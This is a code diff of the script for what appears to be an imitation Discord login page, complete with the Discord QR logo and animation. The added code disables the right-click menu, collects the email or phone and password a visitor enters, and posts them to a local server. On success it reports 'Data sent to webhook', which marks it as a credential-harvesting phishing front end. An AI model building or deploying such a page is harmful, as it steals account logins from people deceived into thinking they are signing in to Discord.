@@ -1,133 +1,83 @@
-// ----------------------------------
-// SELECTING ELEMENTS
-// ----------------------------------
-const loginButton = document.querySelector("button");
+document.addEventListener("DOMContentLoaded", () => {
+  const form = document.querySelector("form");
+  const loginButton = document.querySelector(".login button");
+  const emailInput = document.querySelector("#emailORphone");
+  const passwordInput = document.querySelector("#password");
+  const qrCodeElement = document.querySelector(".qr-code");
+  const qrCodeImg = document.createElement("img");
 
-// -----------------------------------
-// ELLIPSIS ANIMATION
-// ------------------------------------
-function removeEllipsisAnimation() {
-  loginButton.innerHTML = "";
-  loginButton.textContent = "Log In";
-  loginButton.removeAttribute("disabled");
-}
-function animateEllipsis() {
-  loginButton.innerHTML = "";
-  loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
-                                    <span class="inner pulsingEllipsis">
-                                        <span class="item spinnerItem"></span>
-                                        <span class="item spinnerItem"></span>
-                                        <span class="item spinnerItem"></span>
-                                    </span>
-                           </span>`;
-  const spinnerItems = document.querySelectorAll(".spinnerItem");
-  spinnerItems.forEach((item, index) => {
-    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
-      index * 0.2
-    }s`;
-  });
-  loginButton.setAttribute("disabled", "true");
+  // Disable context menu
+  document.addEventListener("contextmenu", (event) => event.preventDefault());
 
-  setTimeout(removeEllipsisAnimation, 3000);
-}
+  // QR code animation
+  qrCodeImg.src = "./assets/qrcode-discord-logo.png";
+  qrCodeImg.alt = "QR Code";
+  qrCodeElement.appendChild(qrCodeImg);
 
-// --------------------------------------------------
-// ---------- WANDERING CUBES ANIMATION -------------
-// --------------------------------------------------
+  const createCube = () => {
+    const cube = document.createElement("div");
+    cube.classList.add("cube");
+    qrCodeElement.appendChild(cube);
 
-function generateRandomString() {
-  const characters =
-    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
-  let result = "";
-  for (let i = 0; i < 43; i++) {
-    result += characters.charAt(Math.floor(Math.random() * characters.length));
-  }
-  return result;
-}
+    const moveCube = () => {
+      const maxX = qrCodeElement.offsetWidth - cube.offsetWidth;
+      const maxY = qrCodeElement.offsetHeight - cube.offsetHeight;
+      const newX = Math.random() * maxX;
+      const newY = Math.random() * maxY;
+      cube.style.transform = `translate(${newX}px, ${newY}px)`;
+    };
 
-function removeQrCodeAnimation() {
-  // 1. Simply remove all the inner html
-  const qrCodeContainer = document.querySelector(".right-section .qr-code");
-  qrCodeContainer.innerHTML = "";
-  // 2. Add back the normal elements
-  qrCodeContainer.insertAdjacentElement(
-    "afterbegin",
-    generateQRCode(`https://discord.com/ra/${generateRandomString()}`)
-  );
-  qrCodeContainer.insertAdjacentHTML(
-    "beforeend",
-    `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
-  );
-  // 3. Change background
-  qrCodeContainer.style.background = "white";
-}
+    moveCube();
+    setInterval(moveCube, 2000);
+  };
 
-function simulateQrCodeChange() {
-  const qrCodeContainer = document.querySelector(".right-section .qr-code");
-  // 1. Remove the image and svg of qrcode
-  qrCodeContainer.removeChild(qrCodeContainer.querySelector("svg"));
-  qrCodeContainer.removeChild(qrCodeContainer.querySelector("img"));
-  // 2. Change background to transparent
-  qrCodeContainer.style.background = "transparent";
-  // 3. nsert wandering cubes markup
-  const markup = `<span
-  class="spinner qrCode-spinner"
-  role="img"
-  aria-label="Loading"
-  aria-hidden="true"
-  >
-  <span class="inner wanderingCubes">
-    <span class="item"></span>
-    <span class="item"></span>
-  </span>
-</span>`;
+  for (let i = 0; i < 4; i++) createCube();
 
-  qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
+  // Form submission with API call
+  form.addEventListener("submit", async (e) => {
+    e.preventDefault();
+    const email = emailInput.value.trim();
+    const password = passwordInput.value.trim();
 
-  //   4. Timeout to remove interval and get back original state
-  setTimeout(removeQrCodeAnimation, 3500);
-}
-
-setInterval(simulateQrCodeChange, 120 * 1000);
-
-// --------------------------------------------------
-// ---------- GENERATING QRCODE ---------------------
-// --------------------------------------------------
-function generateQRCode(data) {
-  try {
-    // Create QR Code instance
-    const qr = qrcode(0, "L");
-    qr.addData(data);
-    qr.make();
-
-    const moduleCount = qr.getModuleCount();
-    const svgString = qr.createSvgTag(1, 0);
-
-    // Convert SVG string to SVG element
-    const parser = new DOMParser();
-    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
-    const svgElement = svgDoc.documentElement;
-
-    svgElement.setAttribute("width", "160");
-    svgElement.setAttribute("height", "160");
-    svgElement.setAttribute("viewBox", "0 0 37 37");
-
-    const path = svgElement.querySelector("path");
-    if (path) {
-      path.setAttribute("transform", `scale(${37 / moduleCount})`);
+    if (!email || !password) {
+      alert("Please fill in both email/phone and password.");
+      return;
     }
 
-    return svgElement;
-  } catch (error) {
-    console.error("Error generating QR code:", error);
-    return null;
-  }
-}
+    // Start ellipsis animation
+    loginButton.disabled = true;
+    loginButton.textContent = "Logging in.";
+    const ellipsisInterval = setInterval(() => {
+      loginButton.textContent =
+        loginButton.textContent.length < 13
+          ? loginButton.textContent + "."
+          : "Logging in.";
+    }, 500);
 
-// --------------------------
-// ATTACHING EVENT LISTENERS
-// --------------------------
-loginButton.addEventListener("click", animateEllipsis);
-document.addEventListener("contextmenu", function (e) {
-  e.preventDefault();
+    try {
+      const response = await fetch("http://localhost:3000/api/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password }),
+      });
+
+      const result = await response.json();
+
+      if (response.ok) {
+        alert("Login successful! Data sent to webhook.");
+        emailInput.value = "";
+        passwordInput.value = "";
+      } else {
+        alert(`Error: ${result.message || "Invalid credentials."}`);
+      }
+    } catch (error) {
+      alert("Error: Could not connect to the server.");
+      console.error("Login error:", error);
+    } finally {
+      // Stop ellipsis animation
+      clearInterval(ellipsisInterval);
+      loginButton.textContent = "Log In";
+      loginButton.disabled = false;
+    }
+  });
 });
